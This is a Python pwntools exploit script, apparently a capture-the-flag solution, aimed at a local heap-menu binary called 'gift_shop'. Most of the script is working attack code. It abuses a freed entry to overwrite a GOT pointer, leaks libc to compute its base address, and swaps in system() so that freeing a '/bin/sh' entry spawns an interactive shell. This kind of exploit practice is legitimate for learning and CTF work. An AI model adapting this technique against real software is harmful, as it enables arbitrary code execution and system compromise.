#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./gift_shop"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf, env=ENV)

strdup_got = 0x602080
free_ptr = 0x4005c0
system_off = 0x45390

def buy(s, c):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(s)
    p.recvuntil("> ")
    p.sendline(c)
    p.recvuntil("Done")

def modify(idx, s):
    p.recvuntil("> ")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(s)
    p.recvuntil("Done")

def view(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.sendline(str(idx))

def remove(idx):
    p.sendline("4")
    p.sendline(str(idx))
    p.recvuntil("Done")


buy("1", "1")
buy("/bin/sh", "2")

remove(0)

p.sendline("5")
p.sendline(p64(0x6020c0))

payload = p64(strdup_got)
payload += p64(0)*3
payload += p32(free_ptr)
modify(0, payload)

p.sendline("5")

p.recvuntil("Hi ")
libc_base = u64(p.recv(6).strip().ljust(8, "\x00"))-0x8b470
log.info("libc_base: " + hex(libc_base))

payload = p64(libc_base + system_off)
p.sendline("2")
p.sendline("0")
p.sendline(payload)

remove(1)

p.interactive()
